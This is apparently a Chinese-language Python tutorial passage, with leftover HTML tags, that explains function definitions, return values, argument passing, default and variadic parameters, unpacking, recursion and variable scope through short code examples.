def func(a: 'spam', b: (1, 10), c: float) -> int:
  return a + b + c
func(1, 2, 3)  # 6
print(func.__annotations__) #{'a': 'spam', 'b': (1, 10), 'c': < class 'float'>, 'return': < class 'int'>}

def func(a: 'spam' = 4, b: (1, 10) = 5, c: float = 6) -> int:
    return a + b + c
print(func(1, 2, 3))         # 6
print(func())                # 15
print(func(1, c=10))         # 16
print(func.__annotations__)  # {'c': < class 'float'>, 'a': 'spam', 'b': (1, 10), 'return': < class 'int'>}

def f(ham: 42, eggs: int = 'spam') -> "Nothing to see here":
    print("Annotations:", f.__annotations__)
    print("Arguments:", ham, eggs)

# def关键字定义了函数f,在函数f中有两个参数:ham,eggs。
# 其中ham没有默认值,而eggs是由默认值的,其默认值为'spam'.
# 参数ham的注释部分为:42;参数eggs的注释部分为:int
# "Nothing to see here"是返回值的注释,这个必须用 '->'连接

# 注释可以根据自己的想法想怎么写就怎么写,如42,int;不过不好的注释有时候会给别人阅读代码带来很大的麻烦

# 如果上面的代码是这样写就很容易理解
def f(ham: int = 42, eggs: str = 'spam') -> 'Nothing to see here':
    print("Annotations:", f.__annotations__)
    print("Arguments:", ham, eggs)


</textarea><pre>
【 空函数 】
如果想定义一个什么事也不做的空函数,可以用pass语句

</pre><textarea>
def nop():
    pass

</textarea><pre>
pass语句什么都不做,实际上pass可以用来作为占位符,比如现在还没想好怎么写函数的代码,就可以先放一个pass,让代码能运行起来,缺少了pass,代码运行就会有语法错误。
pass还可以用在其他语句里比如if语句

</pre><pre>
【 return语句 返回值 】
用return语句指定应该返回的值,该返回值可以是任意类型。return语句在同一函数中可以出现多次,但只要有一个得到执行就会直接结束函数的执行
return [返回值]
其中返回值参数可以指定,也可以省略不写表示将返回空值None

</pre><textarea>
def sum( arg1, arg2 ):
   # 返回2个参数的和"
   total = arg1 + arg2
   print("函数内 : ", total)
   return total;

# 调用sum函数
total = sum( 10, 20 );

</textarea><pre>
函数可以返回多个值
如果程序需要有多个返回值,则既可将多个值包装成列表之后返回,也可直接返回多个值,Python会自动将多个返回值封装成元组
返回值是一个tuple,但是在语法上返回一个tuple可以省略括号,而多个变量可以同时接收一个tuple,按位置赋给对应的值,所以Python的函数返回多值其实就是返回一个tuple,但写起来更方便

</pre>比如在游戏中经常需要从一个点移动到另一个点,给出坐标、位移和角度就可以计算出新的坐标<textarea>
import math       # 导入math包,并允许后续代码引用math包里的sin、cos等函数

def move(x, y, step, angle=0):
    nx = x + step * math.cos(angle)
    ny = y - step * math.sin(angle)
    return nx, ny

# 然后就可以同时获得返回值:
x, y = move(100, 100, 60, math.pi / 6)
print(x, y)   # 151.96152422706632 70.0

# 但其实这只是一种假象,Python函数返回的仍然是单一值:
r = move(100, 100, 60, math.pi / 6)
print(r)      # (151.96152422706632, 70.0)

</textarea><textarea>
def sum_and_avg(list):
    sum = 0
    count = 0
    for e in list:
        if isinstance(e, int) or isinstance(e, float):
            count += 1
            sum += e
    return sum, sum / count

my_list = [20, 15, 2.8, 'a', 35, 5.9, -1.8]
# 获取sum_and_avg函数返回的多个值,多个返回值被封装成元组
print(sum_and_avg(my_list))   # (76.9, 12.816666666666668)

# 也可使用Python提供的序列解包功能,直接使用多个变量接收函数返回的多个值
s, avg = sum_and_avg(my_list)
print(s)     # 76.9
print(avg)   # 12.816666666666668

</textarea><pre>
【 参数检查 】
默认参数值和参数名称是按函数声明中定义的顺序匹配起来的

调用函数时,如果参数个数不对,Python解释器会自动检查出来,并抛出TypeError的错误
但是如果参数类型不对,Python解释器就无法帮助检查
当传入了不恰当的参数如参数类型不对时,内置函数abs会检查出参数错误,也会报TypeError的错误,而自定义的my_abs没有参数检查,会导致if语句出错,出错信息和abs不一样。所以这个函数定义不够完善

</pre><textarea>
def my_abs(x):
    if x >= 0:
        return x
    else:
        return -x

# 添加了参数检查后,如果传入错误的参数类型,函数就可以抛出一个错误
def my_abs(x):
    if not isinstance(x, (int, float)):
        raise TypeError('bad operand type')
    if x >= 0:
        return x
    else:
        return -x

</textarea>

<h4>参数传递</h4><pre>
python类型是属于对象的,变量是没有类型的:
a = [1,2,3]
a = "Runoob"
以上代码中[1,2,3]是List类型,"Runoob"是String类型,而变量a是没有类型,仅仅是一个对象的引用(一个指针),可以是List类型对象,也可以指向String类型对象。

【 可更改(mutable)与不可更改(immutable)对象 】
Python中根据实际参数的类型不同,函数参数的传递方式可分为2种,分别为值传递和引用(地址)传递:
1、值传递:适用于实参类型为不可变类型(字符串、数字、元组、None)
实际上就是将实际参数值的副本传入函数,而参数本身不会受到任何影响。
如fun(a)传递的只是a的值,没有影响a对象本身。比如在fun(a)内部修改a的值,只是修改另一个复制的对象,不会影响a本身
不可变类型:变量赋值a=5后再赋值a=10,这里实际是新生成一个int值对象10,再让a指向它,而5被丢弃,不是改变a的值,相当于新生成了a

2、引用(地址)传递:适用于实参类型为可变类型(列表,字典)
如fun(la)则是将la真正的传过去,修改后fun外部的la也会受影响
值传递和引用传递的区别是,函数参数进行值传递后,若形参的值发生改变不会影响实参的值;而函数参数继续引用传递后,改变形参的值实参的值也会一同改变。
可变类型:变量赋值la=[1,2,3,4]后再赋值la[2]=5则是将list la的第三个元素值更改,本身la没有动,只是其内部的一部分值被修改了

总结:在执行值传递时,改变形式参数的值,实际参数并不会发生改变;而在进行引用传递时,改变形式参数的值,实际参数也会发生同样的改变

python中一切都是对象,严格意义不能说值传递还是引用传递,应该说传不可变对象和传可变对象

结论:
1、不管什么类型的参数,在Python函数中对参数直接使用"="符号赋值是没用的,直接使用"="符号赋值并不能改变参数。
2、如果需要让函数修改某些数据,则可以通过把这些数据包装成列表、字典等可变对象,然后把列表、字典等可变对象作为参数传入函数,在函数中通过列表、字典的方法修改它们,这样才能改变这些数据。

</pre>传不可变对象实例<textarea>
def ChangeInt( a ):
    a = 10

b = 2
ChangeInt(b)
print(b)      # 2

# 示例中有int对象2,指向它的变量是b,在传递给ChangeInt函数时按传值的方式复制了变量b,a和b都指向了同一个Int对象,在a=10时则新生成一个int值对象10,并让a指向它

def swap(a , b) :
    a, b = b, a     # 实现a、b变量的值交换
    print("swap函数里a的值是", a, ";b的值是", b)     # swap函数里a的值是 9 ;b的值是 6
a = 6
b = 9
swap(a , b)
print("交换结束后变量a的值是", a, ";变量b的值是", b)  # 交换结束后变量a的值是 6 ;变量b的值是 9

</textarea>传可变对象实例<textarea>
def changeme( mylist ):
   "函数说明:修改传入的列表"
   mylist.append([1,2,3,4]);
   print("函数内取值: ", mylist)
   return

# 调用changeme函数
mylist = [10,20,30];
changeme( mylist );
print("函数外取值: ", mylist)

# 实例中传入函数的和在末尾添加新内容的对象用的是同一个引用,故输出结果如下:
函数内取值:  [10, 20, 30, [1, 2, 3, 4]]
函数外取值:  [10, 20, 30, [1, 2, 3, 4]]

def swap(dw):
    # 实现dw的a、b两个元素的值交换
    dw['a'], dw['b'] = dw['b'], dw['a']
    print("swap函数里a元素的值是", dw['a'], ";b元素的值是", dw['b'])  # swap函数里a元素的值是 9 ;b元素的值是 6
dw = {'a': 6, 'b': 9}
swap(dw)
print("交换结束后a元素的值是", dw['a'], ";b元素的值是", dw['b'])       # 交换结束后a元素的值是 9 ;b元素的值是 6

'''
引用传递方式的底层实现采用的依然还是值传递的方式
程序开始创建了一个字典对象,并定义了一个dw引用变量(其实就是一个指针)指向字典对象,这意味着此时内存中有两个东西:对象本身和指向该对象的引用变量
接下来主程序开始调用swap()函数,dw变量作为参数传入swap(),这里依然采用值传递方式:把主程序中dw变量的值赋给swap()函数的dw形参,从而完成swap()的dw参数的初始化。主程序中的dw是一个引用变量(也就是一个指针),它保存了字典对象的地址值,当把dw的值赋给swap()的dw参数后,就是让swap()的dw参数也保存这个地址值,即也会引用到同一个字典对象
系统一样复制了dw的副本传入swap()函数。但由于dw只是一个引用变量,因此系统复制的是dw变量,并未复制字典本身。

当程序在swap()函数中操作dw参数时,由于dw只是一个引用变量,故实际操作的还是字典对象。此时不管是操作主程序中的dw变量,还是操作swap()里的dw参数,其实操作的都是它们共同引用的字典对象,它们引用的是同一个字典对象。因此当在swap()函数中交换dw参数所引用字典对象的a、b两个元素的值后,可以看到在主程序中dw变量所引用字典对象的a、b两个元素的值也被交换了。

为了更好地证明主程序中的dw和swap()函数中的dw是两个变量,在swap()函数的最后一行增加如下代码:
#把dw 直接赋值为None,让它不再指向任何对象
dw = None
运行上面代码,结果是swap()函数中的dw变量不再指向任何对象,程序其他地方没有任何改变。主程序调用swap()函数后,再次访问dw变量的a、b两个元素,依然可以输出9、6。可见主程序中的dw变量没有受到任何影响
把swap()函数中的dw赋值为None后,在swap()函数中失去了对字典对象的引用,不可再访问该字典对象。但主程序中的dw变量不受任何影响,依然可以引用该字典对象,所以依然可以输出字典对象的a、b元素的值

'''

</textarea>定义一个名为demo的函数,分别为传入一个字符串类型的变量(代表值传递)和列表类型的变量(代表引用传递)<textarea>
def demo(obj) :
    obj += obj
    print("形参值为:",obj)

# 值传递
a = "C语言中文网"
print("a的值为:",a)
demo(a)
print("实参值为:",a)

# 引用传递
a = [1,2,3]
print("a的值为:",a)
demo(a)
print("实参值为:",a)

'''
a的值为: C语言中文网
形参值为: C语言中文网C语言中文网
实参值为: C语言中文网

a的值为: [1, 2, 3]
形参值为: [1, 2, 3, 1, 2, 3]
实参值为: [1, 2, 3, 1, 2, 3]
'''

</textarea>

<h4>参数类型</h4><pre>
定义函数的时候,把参数的名字和位置确定下来,函数的接口定义就完成了。对于函数的调用者来说,只需要知道如何传递正确的参数以及函数将返回什么样的值就够了,函数内部的复杂逻辑被封装起来,调用者无需了解。

Python的函数定义非常简单,但灵活度却非常大。除了正常定义的必选参数外,还可以使用默认参数、可变参数和关键字参数,使得函数定义出来的接口,不但能处理复杂的参数,还可以简化调用者的代码

1、必备参数(位置参数)
必须按照正确的顺序将实际参数传到函数中,调用函数时传入实际参数的数量和位置都必须和定义函数时保持一致
在调用函数,指定的实际参数的数量,必须和形式参数的数量一致(传多传少都不行),否则Python解释器会抛出TypeError异常,并提示缺少必要的位置参数
在调用函数时,传入实际参数的位置必须和形式参数位置一一对应,否则会产生以下2种结果:
1、抛出TypeError异常:当实际参数类型和形式参数类型不一致,并且在函数中这两种类型之间不能正常转换,此时就会抛出TypeError异常
2、产生的结果和预期不符:调用函数时如果指定的实际参数和形式参数的位置不一致,但它们的数据类型相同,那么程序将不会抛出异常,只不过导致运行结果和预期不符。

</pre><textarea>
# 先写一个计算x的2次方的power(x)函数,参数x就是一个位置参数,当调用power函数时,必须传入有且仅有的一个参数x

def power(x):
    return x * x

print(power(5))
print(power(15))

# 现在如果要计算x的3次方怎么办？可以再定义一个power3函数,但是如果要计算x的4次方、x的5次方怎么办？不可能定义无限多个函数。
# 可以把power(x)修改为power(x, n),用来计算x的n次方,可以计算任意n次方
# 修改后的power(x, n)函数有两个参数:x和n,这两个参数都是位置参数,调用函数时传入的两个值按照位置顺序依次赋给参数x和n

def power(x, n):
    s = 1
    while n > 0:
        n = n - 1
        s = s * x
    return s

print(power(5, 2))
print(power(5, 3))

</textarea><pre>
2、关键字参数
关键字参数是指使用形式参数的名字来确定输入的参数值。通过此方式指定函数实参时,不再需要与形参的位置完全一致,只要将参数名写正确即可

</pre><textarea>
def printme(str):
   "打印任何传入的字符串"
   print(str)

# 作为位置参数调用printme函数
printme("My string");        # My string
# 作为关键字参数调用printme函数
printme(str = "My string");  # My string

# 关键字参数顺序不重要
def printinfo(name, age):
   "打印任何传入的字符串"
   print("Name: ", name, "Age: ", age)
   return;

# 作为位置参数调用printinfo函数
printinfo("miki", 50)           # Name:  miki Age:  50
# 作为关键字参数调用printinfo函数
printinfo(age=50, name="miki")  # Name:  miki Age:  50
# 部分使用关键字参数,部分使用位置参数
printinfo("miki", age=50)       # Name:  miki Age:  50

</textarea><pre>
3、默认参数
在调用函数时,如果不指定某个参数,解释器会抛出异常。为了解决这个问题,Python允许为参数设置默认值,即在定义函数时直接给形式参数指定一个默认值,这样的话即便调用函数时没有给拥有默认值的形参传递参数,该参数可以直接使用定义函数时设置的默认值,默认参数可以简化函数的调用,最大的好处是能降低调用函数的难度
一是必选参数在前,默认参数在后,否则Python的解释器会报错
二是如何设置默认参数:当函数有多个参数时,把变化大的参数放前面,变化小的参数放后面,变化小的参数就可以作为默认参数

由于Python要求在调用函数时关键字参数必须位于位置参数的后面,因此在定义函数时指定了默认值的参数(关键字参数)必须在没有默认值的参数之后

默认参数一定要用不可变对象,如果是可变对象,程序运行时会有逻辑错误

</pre><textarea>
def printinfo(name, age = 35, city = 'beijing'):
   "打印任何传入的字符串"
   print("Name: ", name, "Age ", age, "City ", city)

#调用printinfo函数
printinfo("miki")                      # 只提供必须的name参数
printinfo("miki", 50)                  # 只有与默认参数不符的才需要提供额外的参数
printinfo("miki", 50, 'shanghai')      # 按顺序提供默认参数
printinfo("miki", city = 'shanghai')   # 不按顺序提供部分默认参数时,需要把参数名写上,city参数用传进去的值,其他默认参数继续使用默认值
printinfo(age=50, name="miki")
printinfo(name="miki")

</textarea>默认值是在定义过程中在函数定义处计算的,而不是调用时计算的<textarea>
i = 5

def f(arg=i):
    print(arg)

i = 6
f()    # 5

</textarea><textarea>
def ask_ok(prompt, retries=4, reminder='Please try again!'):
    while True:
        ok = input(prompt)
        if ok in ('y', 'ye', 'yes'):
            return True
        if ok in ('n', 'no', 'nop', 'nope'):
            return False
        retries = retries - 1
        if retries < 0:
            raise ValueError('invalid user response')
        print(reminder)

</textarea>默认参数有个最大的坑:默认参数必须指向不变对象<textarea>
def add_end(L=[]):
    L.append('END')
    return L

# 正常调用
print(add_end([1, 2, 3]))         # [1, 2, 3, 'END']
print(add_end(['x', 'y', 'z']))   # ['x', 'y', 'z', 'END']

# 使用默认参数调用
print(add_end())                  # ['END']

# 再次调用
print(add_end())                  # ['END', 'END']
print(add_end())                  # ['END', 'END', 'END']

# 原因:列表式可变对象,可变对象时引用传递
# Python函数在定义的时候默认参数L的值就被计算出来了即[],因为默认参数L也是一个变量,它指向对象[],
# 每次调用该函数,如果改变了L的内容,则下次调用时默认参数的内容就变了,不再是函数定义时的[]了

# 可以用None这个不变对象来实现
def add_end(L=None):
    if L is None:
        L = []
    L.append('END')
    return L

print(add_end())                  # ['END']
print(add_end())                  # ['END']

# 为什么要设计str、None这样的不变对象呢？因为不变对象一旦创建,对象内部的数据就不能修改,这样就减少了由于修改数据导致的错误。此外由于对象不变,多任务环境下同时读取对象不需要加锁,同时读一点问题都没有。编写程序时如果可以设计一个不变对象,那就尽量设计成不变对象

</textarea>默认值只会执行一次。这条规则在默认值为可变对象(列表、字典以及大多数类实例)时很重要。比如下面的函数会存储在后续调用中传递给它的参数<textarea>
def f(a, L=[]):
    L.append(a)
    return L

print(f(1))
print(f(2))
print(f(3))

# 输出:
[1]
[1, 2]
[1, 2, 3]

# 如果不想要在后续调用之间共享默认值,可以这样写这个函数:
def f(a, L=None):
    if L is None:
        L = []
    L.append(a)
    return L

</textarea><pre>
4、不定长参数即可变参数
传入函数的实参数可以是0个或任意多个

Python定义可变参数,主要有以下2种形式

1) 可变参数:形参前添加一个*
*parameter
其中parameter表示形参名。这种形式表示接受任意多个实际参数,并将其放到一个元组中

</pre><textarea>
# 定义支持参数收集的函数,books参数可以传入多个字符串作为参数值,Python会将传给books参数的多个值收集成一个元组
def test(a, *books) :
    print(type(books), books)  # books被当成元组处理,输出:< class 'tuple'> ('C语言中文网', 'Python教程')
    for b in books :
        print(b, end = '')     # 输出:C语言中文网 Python教程
    print(a)                   # 5

test(5 , "C语言中文网" , "Python教程")

</textarea>Python允许个数可变的形参可以处于形参列表的任意位置,不要求是形参列表的最后一个参数<textarea>
# 定义了支持参数收集的函数,test()函数的第一个参数就是个数可变的形参,由于该参数可接收个数不等的参数值,因此如果需要给后面的参数传入参数值则必须使用关键字参数,否则程序会把所传入的多个值都当成是传给books参数的
def test(*books ,num) :
    print(books)
    for b in books :
        print(b)
    print(num)

test("C语言中文网", "Python教程", num = 20)

</textarea><textarea>
# 给定一组数字a,b,c……,请计算a*a + b*b + c*c + ……
# 要定义出这个函数,必须确定输入的参数。由于参数个数不确定,首先想到可以把a,b,c……作为一个list或tuple传进来
def calc(numbers):
    sum = 0
    for n in numbers:
        sum = sum + n * n
    return sum

# 但是调用的时候,需要先组装出一个list或tuple
print(calc([1, 2, 3]))     # 14
print(calc((1, 3, 5, 7)))  # 84

# 利用可变参数,调用函数的方式可以简化
# 定义可变参数和定义一个list或tuple参数相比,仅仅在参数前面加了一个*号。在函数内部参数numbers接收到的是一个tuple,因此函数代码完全不变。但是调用该函数时可以传入任意个参数,包括0个参数
def calc(*numbers):
    sum = 0
    for n in numbers:
        sum = sum + n * n
    return sum

print(calc(1, 2, 3))      # 14
print(calc(1, 3, 5, 7))   # 84
print(calc())             # 0

# 如果已经有一个list或tuple,要调用一个可变参数可以这样做:
nums = [1, 2, 3]
print(calc(nums[0], nums[1], nums[2]))  # 14

# 这种写法当然是可行的,问题是太繁琐,所以Python允许在list或tuple前面加一个*号,把list或tuple的所有元素变成可变参数传进去:
print(calc(*nums))       # 14

</textarea><pre>
2) 可变参数:形参前添加两个'*'
这种形式的语法格式如下:
**parameter
其中parameter表示形参名。这种形式可以接收任意多个以关键字参数赋值的实际参数,并将其放到一个字典中

</pre><textarea>
# 定义了支持参数收集的函数
def test(x, y, z=3, *books, **scores) :
    print(x, y, z)               # 1 2 3
    print(type(books), books)    # < class 'tuple'> ('C语言中文网', 'Python教程')
    print(type(scores), scores)  # < class 'dict'> {'语文': 89, '数学': 94}

test(1, 2, 3, "C语言中文网" , "Python教程", 语文=89, 数学=94)
# 调用test()时,前面的1、2、3将会传给普通参数x、y、z;接下来的两个字符串将会由books参数收集成元组;最后的两个关键字参数将会被收集成字典

test(1, 2, "C语言中文网" , "Python教程", 语文=89, 数学=94)
# 输出:
1 2 C语言中文网
< class 'tuple'> ('Python教程',)
< class 'dict'> {'语文': 89, '数学': 94}

# 如果希望让z参数的默认值发挥作用,则需要只传入两个位置参数
test(1, 2, 语文=89, 数学=94)
# 前面的1、2将会传给普通参数 x、y,此时z参数将使用默认的参数值3,books参数将是一个空元组;接下来的两个关键字参数将会被收集成字典
1 2 3
()
{'语文': 89, '数学': 94}

</textarea><textarea>
# 函数person除了必选参数name和age外,还接受关键字参数kw,在调用该函数时可以只传入必选参数
def person(name, age, **kw):
    print('name:', name, 'age:', age, 'other:', type(kw), kw)

person('Michael', 30)                       # name: Michael age: 30 other: < class 'dict'> {}

# 也可以传入任意个数的关键字参数
person('Bob', 35, city='Beijing')           # name: Bob age: 35 other: < class 'dict'> {'city': 'Beijing'}
person('Adam',45,gender='M',job='Engineer') # name: Adam age: 45 other: < class 'dict'> {'gender': 'M', 'job': 'Engineer'}

# 关键字参数可以扩展函数的功能。比如在person函数里保证能接收到name和age这两个参数,但是如果调用者愿意提供更多的参数也能收到。
# 一个用户注册的功能,除了用户名和年龄是必填项外,其他都是可选项,利用关键字参数来定义这个函数就能满足注册的需求

# 和可变参数类似,也可以先组装出一个dict,然后把该dict转换为关键字参数传进去
extra = {'city': 'Beijing', 'job': 'Engineer'}
person('Jack', 24, city=extra['city'], job=extra['job'])  # name: Jack age: 24 other: {'city': 'Beijing', 'job': 'Engineer'}

# 上面复杂的调用可以用简化的写法:
person('Jack', 24, **extra)                      # name: Jack age: 24 other: {'city': 'Beijing', 'job': 'Engineer'}

# **extra表示把extra这个dict的所有key-value用关键字参数传入到函数的**kw参数,kw将获得一个dict,kw获得的dict是extra的一份拷贝,对kw的改动不会影响到函数外的extra

</textarea><pre>
逆向参数收集即解包参数列表
逆向参数收集指在程序己有列表、元组、字典等对象的前提下,把它们的元素"拆开"后传给函数的参数。逆向参数收集需要在传入的列表、元组参数之前添加一个星号,在字典参数之前添加两个星号

</pre><textarea>
def test(name, message):
    print("用户是: ", name)
    print("欢迎消息: ", message)

my_list = ['孙悟空', '欢迎来C语言中文网']
test(*my_list)

# 程序中定义了一个需要两个参数的函数,而my_list列表包含两个元素,为了让程序将my_list列表的两个元素传给test()函数,程序在传入的my_list参数之前添加了一个星号。

</textarea>实际上即使是可变参数,如果程序需要将一个元组传给该参数,那么同样需要使用逆向收集<textarea>
def foo(name, *nums):
    print("name参数: ", name)
    print("nums参数: ", nums)

my_tuple = (1, 2, 3)
# 使用逆向收集,将my_tuple元组的元素传给nums参数
foo('fkit', *my_tuple)
# 调用将'fkit'传给foo()函数的name参数,然后使用逆向收集将my_tuple包含的多个元素传给nums参数,nums再将my_tuple的多个元素收集成元组。
# 输出:
name参数:  fkit
nums参数:  (1, 2, 3)

# 使用逆向收集,将my_tuple元组的第一个元素传给name参数,剩下参数传给nums参数
foo(*my_tuple)
# 输出:
name参数:  1
nums参数:  (2, 3)

# 不使用逆向收集即不在元组参数之前添加星号,整个元组将会作为一个参数传给name参数,而不是将元组的元素作为多个参数
foo(my_tuple)
# 输出:
name参数:  (1, 2, 3)
nums参数:  ()

</textarea>字典也支持逆向收集,字典将会以关键字参数的形式传入<textarea>
def bar(book, price, desc):
    print(book, "VIP价格是:", price, '描述信息', desc)

my_dict = {'price': 159, 'book': 'C语言中文网', 'desc': '这是一个精美而实用的网站'}
# 按逆向收集的方式将my_dict的多个key-value传给bar()函数
bar(**my_dict)
# 输出:
C语言中文网 VIP价格是: 159 描述信息 这是一个精美而实用的网站

</textarea>列表、元祖、字典解构赋值、合并<textarea>
list1 = ['a', 'b', 'c']
list2 = ['d', 'b', 'c']
tuple1 = ('a', 'b', 'c')
tuple2 = ('d', 'b', 'c')

print(*list1)             # a b c
print([*list1, *list2])   # ['a', 'b', 'c', 'd', 'b', 'c']
print((*list1, *list2))   # ('a', 'b', 'c', 'd', 'b', 'c')
print((*tuple1, *tuple2)) # ('a', 'b', 'c', 'd', 'b', 'c')

# 简单合并词典
dict1 = {1: 'hello', 2: 'world'}
dict2 = {1: 'today', 3: 'is', 4: 'nice'}
print({**dict1, **dict2})  # {1: 'today', 2: 'world', 3: 'is', 4: 'nice'}

</textarea><pre>
5、命名关键字参数
对于关键字参数,函数的调用者可以传入任意不受限制的关键字参数。至于到底传入了哪些,就需要在函数内部通过kw检查

</pre><textarea>
# 希望检查是否有city和job参数
def person(name, age, **kw):
    if 'city' in kw:   # 有city参数
        pass
    if 'job' in kw:    # 有job参数
        pass
    print('name:', name, 'age:', age, 'other:', kw)

# 但是调用者仍可以传入不受限制的关键字参数
# person('Jack', 24, city='Beijing', addr='Chaoyang', zipcode=123456)  # name: Jack age: 24 other: {'city': 'Beijing', 'addr': 'Chaoyang', 'zipcode': 123456}

# 如果要限制关键字参数的名字就可以用命名关键字参数,例如只接收city和job作为关键字参数
# 和关键字参数**kw不同,命名关键字参数需要一个特殊分隔符*,*后面的参数被视为命名关键字参数
def person(name, age, *, city, job):
    print(name, age, city, job)

# person('Jack', 24, city='Beijing', job='Engineer')                     # Jack 24 Beijing Engineer
# person('Jack', 24, city='Beijing', job='Engineer', zipcode=123456)     # TypeError: person() got an unexpected keyword argument 'zipcode'
# person('Jack', 24, city='Beijing', addr='Chaoyang', zipcode=123456)    # TypeError: person() got an unexpected keyword argument 'addr'
# person('Jack', 24, city='Beijing')                                     # TypeError: person() missing 1 required keyword-only argument: 'job'

# 如果函数定义中已经有了一个可变参数,后面跟着的命名关键字参数就不再需要一个特殊分隔符*了:
def person(name, age, *args, city, job):
    print(name, age, args, city, job)

# 命名关键字参数必须传入参数名,这和位置参数不同。如果没有传入参数名,调用将报错:
# 由于调用时缺少参数名city和job,Python解释器把这4个参数均视为位置参数,但person()函数仅接受2个位置参数
# person('Jack', 24, city='Beijing', job='Engineer')  # Jack 24 () Beijing Engineer
# person('Jack', 24, 'Beijing', 'Engineer')           # TypeError: person() missing 2 required keyword-only arguments: 'city' and 'job'

# 命名关键字参数可以有缺省值,从而简化调用:
def person(name, age, *, city='Beijing', job):
    print(name, age, city, job)

# 由于命名关键字参数city具有默认值,调用时可不传入city参数:
person('Jack', 24, job='Engineer')                  # Jack 24 Beijing Engineer

# 使用命名关键字参数时要特别注意,如果没有可变参数,就必须加一个*作为特殊分隔符。如果缺少*,Python解释器将无法识别位置参数和命名关键字参数:
def person(name, age, city, job):
    # 缺少 *,city和job被视为位置参数
    pass

</textarea><pre>
6、参数组合
在Python中定义函数,可以用必选参数、默认参数、可变参数、关键字参数和命名关键字参数,这5种参数都可以组合使用。但参数定义的顺序必须是:必选参数、默认参数、可变参数、命名关键字参数和关键字参数

所以对于任意函数都可以通过类似func(*args, **kw)的形式调用它,无论它的参数是如何定义的。
*args是可变参数,args接收的是一个tuple
**kw是关键字参数,kw接收的是一个dict

调用函数时如何传入可变参数和关键字参数的语法:
可变参数既可以直接传入:func(1, 2, 3),又可以先组装list或tuple,再通过*args传入:func(*(1, 2, 3));
关键字参数既可以直接传入:func(a=1, b=2),又可以先组装dict,再通过**kw传入:func(**{'a': 1, 'b': 2})

虽然可以组合多达5种参数,但不要同时使用太多的组合,否则函数接口的可理解性很差

</pre><textarea>
# 定义一个函数,包含上述若干种参数
def f1(a, b, c=0, *args, **kw):
    print('a =', a, 'b =', b, 'c =', c, 'args =', args, 'kw =', kw)

def f2(a, b, c=0, *, d, **kw):
    print('a =', a, 'b =', b, 'c =', c, 'd =', d, 'kw =', kw)

# 在函数调用的时候,Python解释器自动按照参数位置和参数名把对应的参数传进去
f1(1, 2)                     # a = 1 b = 2 c = 0 args = () kw = {}
f1(1, 2, c=3)                # a = 1 b = 2 c = 3 args = () kw = {}
f1(1, 2, 3, 'a', 'b')        # a = 1 b = 2 c = 3 args = ('a', 'b') kw = {}
f1(1, 2, 3, 'a', 'b', x=99)  # a = 1 b = 2 c = 3 args = ('a', 'b') kw = {'x': 99}
f2(1, 2, d=99, ext=None)     # a = 1 b = 2 c = 0 d = 99 kw = {'ext': None}

# 最神奇的是通过一个tuple和dict,也可以调用上述函数:
args = (1, 2, 3, 4)
kw = {'d': 99, 'x': '#'}
f1(*args, **kw)             # a = 1 b = 2 c = 3 args = (4,) kw = {'d': 99, 'x': '#'}

args = (1, 2, 3)
kw = {'d': 88, 'x': '#'}
f2(*args, **kw)             # a = 1 b = 2 c = 3 d = 88 kw = {'x': '#'}

</textarea>

<h4>递归函数</h4><pre>
在函数内部可以调用其他函数,如果一个函数在函数体内调用自身,这个函数就是递归函数
递归函数的优点是定义简单,逻辑清晰。理论上,所有的递归函数都可以写成循环的方式,但循环的逻辑不如递归清晰
函数递归包含了一种隐式的循环,它会重复执行某段代码,但这种重复执行无须循环控制

当一个函数不断地调用它自身时,必须在某个时刻函数的返回值是确定的,即不再调用它自身:否则这种递归就变成了无穷递归,类似于死循环。因此在定义递归函数时有一条最重要的规定: 递归一定要向已知方向进行

递归是非常有用的,例如程序希望遍历某个路径下的所有文件,但这个路径下的文件夹的深度是未知的,那么就可以使用递归来实现这个需求。系统可定义一个函数,该函数接收一个文件路径作为参数,该函数可遍历出当前路径下的所有文件和文件路径,即在该函数的函数体中再次调用函数自身来处理该路径下的所有文件路径

</pre>阶乘函数<textarea>
def fact(n):
    if n==1:
        return 1
    return n * fact(n - 1)

</textarea><pre>
使用递归函数需要注意防止栈溢出,在计算机中函数调用是通过栈(stack)这种数据结构实现的,每当进入一个函数调用,栈就会加一层栈帧,每当函数返回栈就会减一层栈帧。由于栈的大小不是无限的,所以递归调用的次数过多会导致栈溢出。
执行fact(1000)会报错:RuntimeError: maximum recursion depth exceeded in comparison

解决递归调用栈溢出的方法是通过尾递归优化,事实上尾递归和循环的效果是一样的,所以把循环看成是一种特殊的尾递归函数也是可以的。

尾递归是指在函数返回的时候调用自身本身,并且return语句不能包含表达式,这样编译器或解释器就可以把尾递归做优化,使递归本身无论调用多少次都只占用一个栈帧,不会出现栈溢出的情况

上面的fact(n)函数由于return n * fact(n - 1)引入了乘法表达式,所以就不是尾递归了。要改成尾递归方式,需要多一点代码,主要是要把每一步的乘积传入到递归函数中

</pre><textarea>
def fact(n):
    return fact_iter(n, 1)

def fact_iter(num, product):
    if num == 1:
        return product
    return fact_iter(num - 1, num * product)  # 仅返回递归函数本身,num-1和num * product在函数调用前就会被计算,不影响函数调用

</textarea><pre>
尾递归调用时,如果做了优化,栈不会增长,因此无论多少次调用也不会导致栈溢出。
遗憾的是,大多数编程语言没有针对尾递归做优化,Python解释器也没有做优化,所以即使把上面的fact(n)函数改成尾递归方式,也会导致栈溢出

</pre>

<h4>变量作用域</h4><pre>
一个程序的所有的变量并不是在哪个位置都可以访问的,访问权限决定于这个变量是在哪里赋值的。
在程序中定义一个变量时,这个变量是有作用范围的,变量的作用范围被称为它的作用域。换句话说,变量的作用域指的是程序代码能够访问该变量的区域,如果超过该区域将无法访问该变量。

根据定义变量的位置(有效范围),可以将变量分为局部变量和全局变量。
1、定义在函数内部的变量拥有一个局部作用域,它只在函数内部有效
每个函数在执行时,系统都会为该函数分配一块"临时内存空间",所有的局部变量都被保存在这块临时内存空间内。当函数执行完成后,这块内存空间就被释放了,这些局部变量也就失效了,因此离开函数之后就不能再访问局部变量了,否则解释器会抛出NameError错误。

2、全局变量指的是能作用于函数内外的变量,即全局变量既可以在各个函数的外部使用,也可以在各函数内部使用
定义全局变量的方式有以下2种
在函数体外定义的变量,一定是全局变量
在函数体内定义全局变量,即使用global关键字对变量进行修饰后,该变量就会变为全局变量,在使用global关键字修饰变量名时不能直接给变量赋初值,否则会引发语法错误

函数的执行会引入一个用于函数局部变量的新符号表。 更确切地说,函数中所有的变量赋值都将存储在局部符号表中;而变量引用会首先在局部符号表中查找,然后是外层函数的局部符号表,最后是内置名称表。 因此全局变量和外层函数的变量不能在函数内部直接赋值(除非是在global语句中定义的全局变量,或在nonlocal语句中定义的外层函数的变量),尽管它们可以被引用

</pre><textarea>
